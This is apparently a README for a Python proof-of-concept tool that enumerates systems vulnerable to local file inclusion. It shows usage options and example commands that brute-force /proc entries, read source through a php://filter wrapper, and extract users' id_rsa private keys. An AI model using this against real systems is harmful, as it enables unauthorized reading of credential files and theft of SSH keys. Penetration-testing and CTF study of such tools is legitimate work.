Local File Inclusion Enumeration (PoC)  

Almost whole system enumeration when target is vulnerable to LFI.  

```zsh
Local File Inclusion Enumerator v1.0 by 0bfxgh0st*
Usage python3 lfienum <url> <option>

Options:

    --pid                Bruteforce 999 process id
    --fd                 Bruteforce /proc/self/fd/X (default set to 30)
    --wrapper            (php://filter/convert.base64-encode/resource=)
    -w or --wordlist     Use a custom wordlist
    -k or --key          Extract id_rsa key

Last positional argument:

    -vvv                 Verbose show package stats
    --only-url           Dump urls only

Examples:

    python3 lfienum "http://ghost.server/index.php?page="
    python3 lfienum "http://ghost.server/index.php?page=" --pid
    python3 lfienum "http://ghost.server/index.php?page=" --fd
    python3 lfienum "http://ghost.server/index.php?page=" --wrapper index.php
    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt
    python3 lfienum "http://ghost.server/index.php?page=" --key
```
Auto id_rsa key extraction from /etc/passwd, check `def IdRSA():` function
